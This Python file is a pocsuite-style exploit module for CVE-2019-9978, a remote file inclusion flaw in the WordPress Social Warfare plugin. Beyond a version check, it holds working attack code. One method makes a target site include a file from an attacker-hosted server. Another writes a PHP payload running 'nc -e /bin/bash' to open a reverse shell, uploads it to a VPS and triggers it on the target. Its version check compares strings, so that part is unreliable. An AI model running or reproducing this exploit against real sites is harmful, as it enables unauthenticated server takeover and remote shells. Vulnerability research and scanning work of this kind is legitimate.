"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin

from Tools.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths
from Tools.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import uuid
from urllib.parse import urlparse, urljoin
import binascii
sys.path.append(os.path.dirname(os.getcwd()) + "/../")
from configvalue import * 
from Tools.PocSuite.init_pocs.cve_2019_9978.contact_vps import send_file_vps

class DemoPOC(POCBase):
    vulID = 'CVE-2019-9978'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '21/03/2019'
    createDate = '2020-11-15'
    updateDate = '2020-11-15'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2019-9978']
    name = 'Wordpress  social-warfare plugin < 3.5.3 - RFI to RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
                "folder_init": "cve_2019_9978"}
    appName = 'wordpress-cve-2019-9978'
    appVersion = 'CVE-2019-9978'
    vulType = VUL_TYPE.REMOTE_FILE_INCLUSION
    desc = '''An attacker can use these vulnerabilities to run arbitrary PHP code and control the website and the server without authentication'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSSv3: 9.0 (AV:N/AC:L/Au:N/C:P/I:P/A:P)'''
    url_result = {}

    # def _options(self):
    #     o = OrderedDict()
    #     payload = {
    #         "nc": REVERSE_PAYLOAD.NC,
    #         "bash": REVERSE_PAYLOAD.BASH,
    #     }
    #     o["command"] = OptDict(selected="bash", default=payload)
    #     return o

    def check_version(self, url):
        p_url = urlparse(self.url)
        base = p_url[2][1:].split('/')[0]
        url = p_url[0] + "://" + p_url[1] + "/" + base + "/wp-content/plugins/social-warfare/readme.txt"
        resp = requests.get(url, verify=False)
        fixed_version = "3.5.3" 
        try: 
            match = re.findall(
                r'== Changelog ==\n\n= ([0-9]+\.[0-9]+\.[0-9])',
                str(resp.text)
            )
            if(match[0]) < fixed_version: 
                return True
            else: 
                return False
        except: return False
         

    def _verify(self):
        result = {}
        check = self.check_version(self.url)
        if check: 
            result['VerifyInfo'] = {} 
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)
           
    def _attack(self):
        result = {}
        check = self.check_version(self.url)
        if check:
            p_url = urlparse(self.url)
            base = p_url[2][1:].split('/')[0]
            r = requests.get(p_url[0] + "://" + p_url[1] + "/" + base + "/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://" + PUBLIC_IP + ":65535/cve-2019-9978-attack.txt")
            if("test cve-2019-9978 successfully!!!" in r.text): 
                result['ShellInfo'] = {}
                result['ShellInfo']["Url"] = self.url 
                result['ShellInfo']['Info'] = "http://" + PUBLIC_IP + ":65535/cve-2019-9978-attack.txt"
            else: return
        return self.parse_output(result)        

    def _shell(self):
        datainput = self.headers['Referer']['input']
        self.headers['Referer'] = ''
        shell = '''<pre>
system('nc -e /bin/bash {} {}');
</pre>'''.format(datainput['LHOST'], datainput['LPORT'])
        filename = os.path.join(paths.POCSUITE_ROOT_PATH, 'init_pocs/cve_2019_9978/cve-2019-9978-shell.txt')
        with open(filename, "wb") as file:
            file.write( str.encode(shell))
            file.close()
        urlexploit = datainput['entrypoint']
        send_file_vps(filename,'cve-2019-9978-shell.txt')
        print(urlexploit + "/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://" + PUBLIC_IP + ":65535/cve-2019-9978-shell.txt")
        r = requests.get(urlexploit + "/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://" + PUBLIC_IP + ":65535/cve-2019-9978-shell.txt")
        
       
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)
